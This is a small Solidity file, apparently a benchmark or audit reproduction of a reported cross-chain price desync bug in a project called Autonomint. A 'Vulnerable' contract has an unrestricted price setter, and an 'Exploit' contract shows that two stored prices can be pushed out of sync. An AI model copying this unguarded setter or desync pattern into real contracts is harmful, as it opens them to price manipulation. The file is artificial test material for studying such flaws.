// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 45459: Autonomint cross-chain price desync. Reduced local model preserves the reported state transition.

contract Vulnerable {
    uint256 public lastEthPriceA = 100; uint256 public lastEthPriceB = 100; function setA(uint256 p) external { lastEthPriceA = p; } function priceB() external view returns (uint256) { return lastEthPriceB; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.setA(200); success = bug.priceB() == 100 && bug.lastEthPriceA() == 200;
    }
}


